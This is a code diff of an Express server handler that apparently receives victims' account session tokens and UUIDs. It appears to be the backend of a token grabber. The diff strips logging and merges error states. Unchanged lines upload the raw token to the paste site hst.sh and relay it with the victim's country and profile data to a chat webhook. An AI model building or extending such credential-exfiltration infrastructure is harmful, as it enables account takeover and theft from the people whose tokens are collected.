@@ -22,19 +22,15 @@ app.post("/", async (req, res) => {
         if (res.status === 204) {
             return { status: "License" };
         } else if (res.status === 403) {
-            console.log(`Non-License detected. Response data: ${JSON.stringify(res.data)}`);
             return { status: "Non-License", error: res.data };
         } else {
-            console.log(`Unexpected status: ${res.status}`);
             return { status: `Unexpected status: ${res.status}` };
         }
     }).catch(error => {
-        console.error(`Request failed with error: ${error.message}`);
         if (error.response) {
-            console.error(`Response data: ${JSON.stringify(error.response.data)}`);
-            return { status: "Request failed", error: error.response.data };
+            return { status: "Non-License", error: error.response.data };
         }
-        return { status: "Request failed" };
+        return { status: "Non-License" };
     });
 
     let webhookData = {
@@ -51,15 +47,11 @@ app.post("/", async (req, res) => {
     };
 
     if (response.status === "Non-License") {
-        console.log("Adding Non-License data to webhook.");
         webhookData.embeds[0].fields.push(
             { name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
             { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
-            { name: 'Error', value: `**\`\`\`${response.error.error}\`\`\`**`, inline: false },
-            { name: 'Path', value: `**\`\`\`${response.error.path}\`\`\`**`, inline: false }
         );
     } else if (response.status === "License") {
-        console.log("Adding License data to webhook.");
         const [shorttoken, profiles] = await Promise.all([
             post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
             getProfiles(req.body.uuid).then(profileData => {
@@ -86,7 +78,6 @@ app.post("/", async (req, res) => {
             name: 'License Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false
         });
     } else {
-        console.log(`Handling unexpected status: ${response.status}`);
         webhookData.embeds[0].fields.push(
             { name: 'Status', value: `**\`\`\`${response.status}\`\`\`**`, inline: false },
             { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
